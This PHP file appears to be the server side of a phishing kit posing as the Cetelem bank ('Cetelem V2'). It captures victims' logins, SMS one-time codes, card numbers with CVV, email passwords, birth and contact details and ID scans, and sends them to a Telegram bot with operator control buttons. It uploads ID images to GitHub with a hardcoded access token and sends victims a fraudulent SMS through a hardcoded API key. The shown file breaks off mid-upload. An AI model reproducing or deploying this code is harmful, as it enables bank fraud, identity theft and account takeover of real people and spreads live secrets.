<?php
set_time_limit(0);
error_reporting(E_ALL);
ini_set("display_errors", 1);
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}


$local_userAgent = isset($_SERVER["HTTP_USER_AGENT"])
    ? $_SERVER["HTTP_USER_AGENT"]
    : "";
$local_time = date("Y-m-d H:i:s");
$local_domain = $_SERVER["SERVER_NAME"];
$local_os = get_platform($local_userAgent);
$local_browser = get_browser_value($local_userAgent);
$currentUrlPath = $_SERVER['REQUEST_URI'];
$domain = $_SERVER['HTTP_HOST'];
$botToken = '';
$chat_Id   = '';
preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
$folderName = isset($matches[1]) ? $matches[1] : '';
global  $local_userAgent, $local_time, $local_domain, $local_os, $local_browser,$chat_Id,$botToken;

function get_platform($USER_AGENT)
{
    $OS_ERROR = "Unknown OS Platform";
    $OS = [
        "/windows nt 11/i" => "Windows 11",
        "/windows nt 10/i" => "Windows 10",
        "/windows nt 6.3/i" => "Windows 8.1",
        "/windows nt 6.2/i" => "Windows 8",
        "/windows nt 6.1/i" => "Windows 7",
        "/windows nt 6.0/i" => "Windows Vista",
        "/windows nt 5.2/i" => "Windows Server 2003/XP x64",
        "/windows nt 5.1/i" => "Windows XP",
        "/windows xp/i" => "Windows XP",
        "/windows nt 5.0/i" => "Windows 2000",
        "/windows me/i" => "Windows ME",
        "/win98/i" => "Windows 98",
        "/win95/i" => "Windows 95",
        "/win16/i" => "Windows 3.11",
        "/macintosh|mac os x/i" => "Mac OS X",
        "/mac_powerpc/i" => "Mac OS 9",
        "/linux/i" => "Linux",
        "/ubuntu/i" => "Ubuntu",
        "/iphone/i" => "iPhone",
        "/ipod/i" => "iPod",
        "/ipad/i" => "iPad",
        "/android/i" => "Android",
        "/blackberry/i" => "BlackBerry",
        "/webos/i" => "Mobile",
    ];
    foreach ($OS as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }
    }
    return $OS_ERROR;
}
function get_browser_value($USER_AGENT)
{
    $BROWSER_ERROR = "Unknown Browser";
    $BROWSER = [
        "/msie/i" => "Internet Explorer",
        "/firefox/i" => "Firefox",
        "/safari/i" => "Safari",
        "/chrome/i" => "Chrome",
        "/edge/i" => "Edge",
        "/opera/i" => "Opera",
        "/netscape/i" => "Netscape",
        "/maxthon/i" => "Maxthon",
        "/konqueror/i" => "Konqueror",
        "/mobile/i" => "Handheld Browser",
    ];
    foreach ($BROWSER as $regex => $value) {
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
function getClientIP()
{
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        $ipAddress = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ipAddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        $ipAddress = $_SERVER["REMOTE_ADDR"];
    }

    $validIPs = [];
    $ipMatches = preg_match_all(
        "/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/",
        $ipAddress,
        $matches
    );

    if ($ipMatches) {
        $validIPs = $matches[0];
    }

    if (!empty($validIPs)) {
        $_SESSION["session_ip"] = $validIPs[0];
        return $validIPs[0];
    } else {
        $_SESSION["session_ip"] = "127.0.0.1";
        return "127.0.0.1";
    }
}	
function fetchIPInfo($ipAddress)
{
    $url = "http://ip-api.com/php/{$ipAddress}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    $info = unserialize($response);
    $_SESSION["session_isp"] = isset($info["isp"]) ? $info["isp"] : null;
    $_SESSION["session_country"] = isset($info["country"])
        ? $info["country"]
        : null;
    $_SESSION["session_country_code"] = isset($info["countryCode"])
        ? $info["countryCode"]
        : null;
    $_SESSION["session_city"] = isset($info["city"]) ? $info["city"] : null;
    $_SESSION["session_region"] = isset($info["region"])
        ? $info["region"]
        : null;
    $proxy = isset($info["proxy"]) ? $info["proxy"] : null;
    $_SESSION["session_proxy"] = $proxy == 1 ? "True" : "False";
    $mobile = isset($info["mobile"]) ? $info["mobile"] : null;
    $_SESSION["session_mobile"] = $mobile == 1 ? "True" : "False";
    $hosting = isset($info["hosting"]) ? $info["hosting"] : null;
    $_SESSION["session_hosting"] = $hosting == 1 ? "True" : "False";
}
function tele_message($message)
{
	$chatid = $_COOKIE['idtel']   ?? $chat_Id;
    $token  = $_COOKIE['tokentel'] ?? $botToken;
    $api_url = "https://api.telegram.org/bot{$token}/sendMessage";
    $params = ["chat_id" => $chatid, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
function up_file_log($content)
{
    $filePath = 'log.txt';
    $content .= "\n";
    if (file_exists($filePath))
    {
        $existingContent = file_get_contents($filePath);
        $newContent = $content . $existingContent;
        file_put_contents($filePath, $newContent);
    }
    else
    {
        $file = fopen($filePath, 'w');
        if ($file) {
            fwrite($file, $content);
            fclose($file);
        } else {
            echo "Failed to open the file.";
        }
    }
}
function check_file($user, $filename) 
{
	$fileFullPath = $filename;

    if (file_exists($fileFullPath)) {
        return true;
    } else {
        return false;
    }
}

function sendKey($rezdata) {
    global $chat_Id, $botToken;
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = $matches[1] ?? '';

	$chatid = $_COOKIE['idtel']   ?? $chat_Id;
    $token  = $_COOKIE['tokentel'] ?? $botToken;
    $show_web_panel = true;
    $show_confirm = true;
    $show_ban = true;

    $file_s = 'login.php';
	if (check_file($folderName, $file_s)) {
		 $show_login = true;
	 }else{
		 $show_login = false;
	 }
	 $file_s = 'utilisateur.php';
	if (check_file($folderName, $file_s)) {
		 $show_utilisateur = true;
	 }else{
		 $show_utilisateur = false;
	 }
	 $file_s = 'usager.php';
	if (check_file($folderName, $file_s)) {
		 $show_usager = true;
	 }else{
		 $show_usager = false;
	 }
	 $file_s = 'operationsapp.php';
	if (check_file($folderName, $file_s)) {
		 $show_operationsapp = true;
	 }else{
		 $show_operationsapp = false;
	 }
	 $file_s = 'operationssms.php';
	if (check_file($folderName, $file_s)) {
		 $show_operationssms = true;
	 }else{
		 $show_operationssms = false;
	 }
	 $file_s = 'alert.php';
	if (check_file($folderName, $file_s)) {
		 $show_alert = true;
	 }else{
		 $show_alert = false;
	 }
	$file_s = 'phone.php';
	if (check_file($folderName, $file_s)) {
		 $show_phone = true;
	 }else{
		 $show_phone = false;
	 }	 
	$file_s = 'sms.php';
	if (check_file($folderName, $file_s)) {
		  $show_sms = true;
	 }else{
		  $show_sms = false;
	 }
	$file_s = 'email.php';
	if (check_file($folderName, $file_s)) {
		  $show_email = true;
	 }else{
		$show_email = false;
	 }
	$file_s = 'app.php';
	if (check_file($folderName, $file_s)) {
		 $show_app = true;
	 }else{
		$show_app = false;
	 }
	$file_s = 'pin.php';
	if (check_file($folderName, $file_s)) {
		 $show_pin = true;
	 }else{
		 $show_pin = false;
	 }
	$file_s = 'message.php';
	if (check_file($folderName, $file_s)) {
		  $show_message = true;
	 }else{
		 $show_message = false;
	 }
	$file_s = 'card.php';
	if (check_file($folderName, $file_s)) {
		 $show_card = true; 
	 }else{
		$show_card = false; 
	 }
	$file_s = 'logout.php';
	if (check_file($folderName, $file_s)) {
		 $show_confirm = true;
	 }else{
		 $show_confirm = false;
	 }

    $url    = "https://$domain/web/api.php?userid=$folderName";

    // 1) Build a flat list of buttons [ ['text'=>'…','url'=>'…'], ... ]
    $buttons = [];
    if ($show_web_panel)     $buttons[] = ["text" => "🌍 Web Panel",       "url" => $url];
    if ($show_login)         $buttons[] = ["text" => "🔑 Re-Login",        "url" => "$url&action=login"];
    if ($show_phone)         $buttons[] = ["text" => "📞 Phone",           "url" => "$url&action=phone"];
    if ($show_sms)           $buttons[] = ["text" => "📲 SMS",             "url" => "$url&action=sms"];
    if ($show_email)         $buttons[] = ["text" => "📧 Email",           "url" => "$url&action=email"];
    if ($show_app)           $buttons[] = ["text" => "💿 APP",             "url" => "$url&action=app"];
    if ($show_pin)           $buttons[] = ["text" => "🔐 RIO",             "url" => "$url&action=pin"];
    if ($show_message)       $buttons[] = ["text" => "🖨️ MSG",             "url" => "$url&action=msg"];
    if ($show_card)          $buttons[] = ["text" => "💳 Card",            "url" => "$url&action=card"];
    if ($show_utilisateur)   $buttons[] = ["text" => "🏥 Utilisateur",     "url" => "$url&action=utilisateur"];
    if ($show_usager)        $buttons[] = ["text" => "🛢 Usager",           "url" => "$url&action=usager"];
    if ($show_alert)         $buttons[] = ["text" => "⚠ Alert",            "url" => "$url&action=alert"];
    if ($show_operationsapp) $buttons[] = ["text" => "🗯 Operations APP",   "url" => "$url&action=operationsapp"];
    if ($show_operationssms) $buttons[] = ["text" => "🤿 Operations SMS",   "url" => "$url&action=operationssms"];
    if ($show_confirm)       $buttons[] = ["text" => "✅ CONFIRM ✅",      "url" => "$url&action=done"];
    if ($show_ban)           $buttons[] = ["text" => "⛔ BAN IP ⛔",        "url" => "$url&action=ban"];

    // 2) Chunk into rows of 2 buttons each
    $inline_keyboard = array_chunk($buttons, 2);

    // 3) Encode and send
    $keyboard = json_encode(["inline_keyboard" => $inline_keyboard]);
    $parameters = [
        "chat_id"      => $chatid,
        "text"         => $rezdata,
        "reply_markup" => $keyboard
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($parameters),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}


function BinCheck($new_string) {
    $cc = $new_string;
    $bin = substr($cc, 0, 6);
    $bins = str_replace(' ', '', $bin);
    
    $ch = curl_init();
    $url = "https://lookup.binlist.net/" . $bin;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
        return null;
    }

    curl_close($ch);

    $someArray = json_decode($res, true);
    
    if (isset($someArray['bank']['name'])) {
        $j_name = $someArray['bank']['name'];
    } else {
        $j_name = "Unknown Bank";
    }
	
	if (isset($someArray['scheme'])) {
        $j_scheme = $someArray['scheme'];
    } else {
        $j_scheme = "Unknown scheme";
    }

    if (isset($someArray['type'])) {
        $j_type = $someArray['type'];
    } else {
        $j_type = "Unknown Type";
    }

    if (isset($someArray['brand'])) {
        $j_brand = $someArray['brand'];
    } else {
        $j_brand = "Unknown Brand";
    }

    if (isset($someArray['country']['name'])) {
        $j_country = $someArray['country']['name'];
    } else {
        $j_country = "Unknown Country";
    }
    
    return array($j_scheme, $j_name, $j_type, $j_brand, $j_country);
}

function getCardInfoFromBIN($bin) {
    $url = "https://lookup.binlist.net/" . urlencode($bin);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Accept-Version: 3",
        "User-Agent: PHP BIN Checker"
    ]);

    $response = curl_exec($ch);
    $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpStatus !== 200 || !$response) {
        return [
            'success' => false,
            'error' => "HTTP error $httpStatus or empty response."
        ];
    }

    $data = json_decode($response, true);
    if (!$data) {
        return [
            'success' => false,
            'error' => "Invalid JSON response."
        ];
    }

    return [
        'success' => true,
        'scheme' => $data['scheme'] ?? 'Unknown',
        'type' => $data['type'] ?? 'Unknown',
        'brand' => $data['brand'] ?? 'Unknown',
        'bank' => $data['bank']['name'] ?? 'Unknown',
        'bank_url' => $data['bank']['url'] ?? '',
        'bank_phone' => $data['bank']['phone'] ?? '',
        'country' => $data['country']['name'] ?? 'Unknown',
        'currency' => $data['country']['currency'] ?? '',
        'emoji' => $data['country']['emoji'] ?? ''
    ];
}


function validateCard($card_number, $cvv, $expiry_date) {
    $result = ['valid' => true, 'error_message' => ''];
    if (!preg_match('/^\d{16}$/', $card_number)) {
        $result['valid'] = false;
        $result['error_message'] = "0";
        return $result;
    }

    if (!preg_match('/^\d{3}$/', $cvv)) {
        $result['valid'] = false;
        $result['error_message'] = "1";
        return $result;
    }
    if (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $expiry_date)) {
        $result['valid'] = false;
        $result['error_message'] = "2";
        return $result;
    } else {
        $current_year = (int)date('y');
        $current_month = (int)date('m');

        list($exp_month, $exp_year) = explode('/', $expiry_date);
        $exp_month = (int)$exp_month;
        $exp_year = (int)$exp_year;

        if ($exp_year < $current_year || ($exp_year === $current_year && $exp_month < $current_month)) {
            $result['valid'] = false;
            $result['error_message'] = "3";
            return $result;
        }
    }

    return $result;
}

function extractBin($cardNumber) {
    // Remove spaces or dashes
    $cleaned = preg_replace('/\D/', '', $cardNumber);

    // Return first 6 digits
    return substr($cleaned, 0, 6);
}


// your existing sendFileToTelegram() helper:
function sendFileToTelegram(string $fieldName, string $token, string $chatid)
{
    if (
        !isset($_FILES[$fieldName]) ||
        !is_uploaded_file($_FILES[$fieldName]['tmp_name'])
    ) {
        throw new RuntimeException("No upload for {$fieldName}");
    }

    $path = $_FILES[$fieldName]['tmp_name'];
    $name = basename($_FILES[$fieldName]['name']);

    // optional: validate size, type, etc.
    $maxSize = 9 * 1024 * 1024; // 9 MB
    if (filesize($path) > $maxSize) {
        throw new RuntimeException("File is too large. Maximum is 9 MB.");
    }

    $postFields = [
        'chat_id'  => $chatid,
        'document' => new CURLFile($path, mime_content_type($path), $name),
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendDocument");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $res = curl_exec($ch);
    if ($res === false) {
        throw new RuntimeException("CURL error: " . curl_error($ch));
    }
    $json = json_decode($res, true);
    curl_close($ch);

    if (empty($json['ok'])) {
        throw new RuntimeException("Telegram API error: " . $res);
    }
}


function sendSMSMailingVoxCurl(array $config) {
    $endpoint = 'https://v3.mailingvox.com/api/envoyer/sms';

    $defaults = [
        'key' => '',                    // REQUIRED
        'message' => '',               // REQUIRED
        'destinataires' => '',         // REQUIRED (can be string or array)
        'expediteur' => '',            // Optional (11 chars max)
        'date' => '',                  // Optional (timestamp)
        'smslong' => '',               // Optional ("1")
        'smslongnbr' => '',            // Optional
        'tronque' => '',               // Optional ("1")
        'encodage' => '',              // Optional: 'auto' or 'ucs2'
        'nom' => '',                   // Optional campaign name
        'destinataires_type' => '',    // Optional: all, groupe, datas
        'url' => '',                   // Optional push URL
        'date_debut' => '',            // Optional (timestamp)
        'date_fin' => '',              // Optional (timestamp)
        'creneaux' => '',              // Optional (comma-separated hours)
        'creneaux_heure' => '',        // Optional (1-6)
        'jours' => '',                 // Optional (comma-separated 1-6)
        'timezone' => '',              // Optional (e.g., Europe/Paris)
        'erreur_texte' => '',          // Optional ("1" to get error text)
    ];

    // Merge user-provided config with defaults
    $params = array_merge($defaults, $config);

    // Encode arrays (e.g., destinataires as JSON if needed)
    if (is_array($params['destinataires'])) {
        $params['destinataires'] = json_encode($params['destinataires']);
    }

    if (is_array($params['creneaux'])) {
        $params['creneaux'] = implode(',', $params['creneaux']);
    }

    if (is_array($params['jours'])) {
        $params['jours'] = implode(',', $params['jours']);
    }

    // Remove empty values to avoid unnecessary query noise
    $filtered = array_filter($params, fn($val) => $val !== '' && $val !== null);

    // Build query string
    $query = http_build_query($filtered);

    // Send request
    $ch = curl_init($endpoint . '?' . $query);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        return ['success' => false, 'error' => 'cURL Error: ' . $curlError];
    }

    $data = json_decode($response, true);

    if ($httpCode !== 200) {
        return ['success' => false, 'error' => "HTTP Error $httpCode", 'response' => $data];
    }

    if (isset($data['resultat']) && $data['resultat'] == 1) {
        return ['success' => true, 'id' => $data['id']];
    }

    return ['success' => false, 'error' => $data['erreurs'] ?? 'Unknown error', 'response' => $data];
}

function formatFrenchNumber($number) {
    // Remove spaces, dashes, parentheses, etc.
    $clean = preg_replace('/[^0-9]/', '', $number);

    // If it starts with 0 and is followed by 9 digits, replace with +33
    if (preg_match('/^0[1-9]\d{8}$/', $clean)) {
        return '+33' . substr($clean, 1);
    }

    // If it's already in international format, keep it
    if (preg_match('/^\+33[1-9]\d{8}$/', $number)) {
        return $number;
    }

    return false; // Invalid number format
}




function generateRandomFilename(?string $extension): string {
    // sanitize/whitelist the extension to alphanumerics only
    $ext = preg_match('/^[a-z0-9]+$/', $extension) 
         ? $extension 
         : 'bin';

    // random 16-hex chars
    $basename = bin2hex(random_bytes(8));

    return "{$basename}.{$ext}";
}

function uploadToGitHub(array $gh, string $fileName, string $content): array {
    $path = rawurlencode($gh['upload_dir'] . $fileName);
    $url  = "https://api.github.com/repos/{$gh['repo_owner']}/{$gh['repo_name']}/contents/{$path}";

    $body = json_encode([
        'message' => "Design upload: {$fileName}",
        'content' => base64_encode($content),
        'branch'  => $gh['branch']
    ], JSON_UNESCAPED_SLASHES);

    $headers = [
        "Authorization: token {$gh['access_token']}",
        "User-Agent: DesignUploader",
        "Content-Type: application/json",
        "Content-Length: " . strlen($body)
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST  => 'PUT',
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_POSTFIELDS     => $body,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_TIMEOUT        => 30,
    ]);

    $resp     = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if (curl_errno($ch)) {
        $err = curl_error($ch);
        curl_close($ch);
        throw new Exception("cURL error: {$err}");
    }
    curl_close($ch);

    // Log the actual response
    error_log("GitHub API HTTP {$httpCode} response: {$resp}");

    $data = json_decode($resp, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        throw new Exception('Invalid JSON from GitHub: ' . json_last_error_msg());
    }
    if ($httpCode < 200 || $httpCode >= 300) {
        $msg = $data['message'] ?? "HTTP {$httpCode} error";
        throw new Exception("GitHub API error: {$msg}", $httpCode);
    }
    $downloadUrl = $data['content']['download_url']
                ?? sprintf(
                     'https://raw.githubusercontent.com/%s/%s/%s/%s%s',
                     $gh['repo_owner'],
                     $gh['repo_name'],
                     $gh['branch'],
                     $gh['upload_dir'] ?? '',
                     $fileName
                   );

    // inject it so caller can use both API data and URL
    $data['download_url'] = $downloadUrl;

    return $data;
}


// 3) Your PAT  
$token = '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';

// 4) Config
$config = [
    'github' => [
        'repo_owner'   => 'FuryZoneMaster',
        'repo_name'    => 'ctfile',
        'access_token' => $token,
        'branch'       => 'main',
        'upload_dir'   => ''  
    ],
    'max_file_size' => 20 * 1024 * 1024,  // 20 MiB
    'allowed_types' => [
        'image/jpeg',
        'image/png',
        'image/gif',
        'image/webp',
        'image/svg+xml',
        'application/pdf'
    ]
];


if ($_SERVER["REQUEST_METHOD"] === "POST")
{
	
    $currentUrlPath = $_SERVER['REQUEST_URI'];
    $domain = $_SERVER['HTTP_HOST'];
    preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
    $folderName = isset($matches[1]) ? $matches[1] : '';
    $url = "https://$domain/web/api.php?userid=$folderName";
    $ipaddress = getClientIP();
    fetchIPInfo($ipaddress);
	if (isset($_SESSION["session_country_code"])) {
        $country_code = strtoupper($_SESSION["session_country_code"]);
    } else {
        $country_code = '';
    }

	$subscibe = "Cetelem V2 - ($country_code)";
    $country = $_SESSION["session_country"];
    $isp = $_SESSION["session_isp"];
    $city = $_SESSION["session_city"];
    $proxy = $_SESSION["session_proxy"];	
    $local_time = date("Y-m-d H:i:s");	




	if (isset($_POST['real_username']) && isset($_POST['real_password'])) 
	{
		  
	     $user = $_POST['real_username'];
         $pass = $_POST['real_password'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 
------------------------------------
💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Login to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);

	}	

    if (isset($_POST['otp_code'])) 
	{
		  
	     $j_sms_code = $_POST['otp_code'];
         $message = "
➡️ 🆂🅼🆂
------------------------------------
🔑  𝗦𝗠𝗦 𝗖𝗼𝗱𝗲: {$j_sms_code}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send SMS to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
	}
    if (isset($_POST['one']) && isset($_POST['two'])&& isset($_POST['three'])) 
	{
		  
	     $j_card = $_POST['one'];
         $j_exp = $_POST['two'];
		 $j_cvv = $_POST['three'];
		// $validation_result = validateCard($j_card, $j_cvv, $j_exp);
              
		 $bin = extractBin("5395$j_card");
         $info = getCardInfoFromBIN($bin);
		 
		 if ($info['success']) {
			 
	
		 $scheme = $info['scheme'];
         $type = $info['type'];
         $brand = $info['brand'];
         $name = $info['bank'];
         $country = $info['country'];

        } else {
         $phone = "";
         $url = "";
		 $scheme = "";
         $type = "";
         $brand = "";
         $name = "";
         $country = "";
        }
        


        

         $message = "
➡️ 🅲🅰🆁🅳
------------------------------------
💳  𝗖𝗮𝗿𝗱: {$j_card}
💳  𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {$j_exp}
💳  𝗰𝘃𝘃: {$j_cvv}
------------------------------------
🏛️ BIN: {$bin}
🏛️ BANK INFO'S: {$scheme}
🏛️ Banque : {$name}
🏛️ Niveau : {$brand}
🏛️ Type : {$type}
🏛️ Country : {$country}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 $_SESSION["one"] = $j_card;
		 up_file_log("User Send Card to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		 
		
	}
	if (isset($_POST['email_address']) && isset($_POST['email_password'])) 
	{
		  
	     $user = $_POST['email_address'];
         $pass = $_POST['email_password'];
         $message = "
➡️ 🅻🅾🅶🅸🅽 (EMAIL)
------------------------------------

💻  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: $user
🔑  𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: $pass
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 up_file_log("User Send Email to Telegram|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $subscibe);
	}		 
	if (isset($_POST['jour_naissance']) && isset($_POST['departement_naissance'])&& isset($_POST['mois_naissance'])&& isset($_POST['annee_naissance'])) 
	{
		  
	     $j_name = $_POST['nom'];
		 $j_prenom =  $_POST['prenom'];
		 
         $jour_naissance = $_POST['jour_naissance'];
		 $mois_naissance = $_POST['mois_naissance'];
		 $annee_naissance = $_POST['annee_naissance'];
		 
		 $departement_naissance = $_POST['departement_naissance'];
		 $j_phone = $_POST['telephone'];
		 $j_email = $_POST['email'];
		 $vile = $_POST['vile'];
		 $_SESSION['email_id'] = $j_email;
		 $_SESSION['phone_id'] = $j_phone;
		 $_SESSION['name_id'] = "$j_name $j_prenom";
		
		 
         $message = "
🅱🅸🅻🅻🅸🅽🅶 
------------------------------------
👔  𝗡𝗮𝗺𝗲: {$j_name} {$j_prenom}
🏳️  𝗔𝗱𝗱𝗿𝗲𝘀𝘀: {$departement_naissance}
🌇  𝗩𝗶𝗹𝗲: {$vile}
👨‍👩‍👧‍👦  𝗗𝗼𝗯: {$jour_naissance}/{$mois_naissance}/{$annee_naissance}
📱  𝗣𝗵𝗼𝗻𝗲: {$j_phone}
📧  𝗘𝗺𝗮𝗶𝗹: {$j_email}
------------------------------------
⚠️  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$subscibe}
🌐  𝗣𝗮𝗻𝗲𝗹: Active
📡  𝗜𝗣: {$ipaddress}
🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
🗺️  𝗦𝗜𝗣: {$isp}
🏠  𝗖𝗶𝘁𝘆: {$city}
🎭  𝗣𝗿𝗼𝘅𝘆: {$proxy}
🪙  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$local_browser}
🔦  𝗢𝗦: {$local_os}
📆  𝗗𝗮𝘁𝗲: {$local_time}
------------------------------------
🅿🅰🅽🅴🅻
";			 
		 $blank_page = $subscibe;
		 up_file_log("User Send Billing to Telegram|$subscibe|OK $local_time");
		  up_file_log("System Send SMS to user|$subscibe|OK $local_time");
		 $up_file = fopen("project.txt", "w");
		 fwrite($up_file, $blank_page);
		 sendKey($message);
         $blank_page = ' ';
         $up_file = fopen("api.txt", "w");
         fwrite($up_file, $blank_page);
		 $msg_bil = "Vous devez impérativement mettre à jour votre justificatif d'identité pour éviter toute interruption de service. Merci de procéder dès que maintenant.";
	
	$formatted = formatFrenchNumber($j_phone);
	$response = sendSMSMailingVoxCurl([
    'key' => '87245625e2bf45b3c812ae53ea198c0a',
    'destinataires' => $formatted,
    'message' => $msg_bil,
    'expediteur' => '38656',
    'encodage' => 'ucs2',
    'smslong' => '1',
    'erreur_texte' => '1',
    'nom' => 'TestCampaign1'
]);

 
	
	}    
    if (isset($_POST['j_recto']) && isset($_POST['j_verso'])) 
	{

	   $chatid = $_COOKIE['idtel']   ?? $chat_Id;
       $token  = $_COOKIE['tokentel'] ?? $botToken;     
	  // sendFileToTelegram('rectoFile', $token, $chatid);
	   $file = $_FILES['rectoFile'];
	  $contents = file_get_contents($file['tmp_name']);
	$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $name = generateRandomFilename($ext);
	$result_gitgub_1   = uploadToGitHub($config['github'], $name, $contents); 
	$file = $_FILES['versoFile'];
	$contents = file_get_contents($file['tmp_name']);
	$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $name = generateRandomFilename($ext);
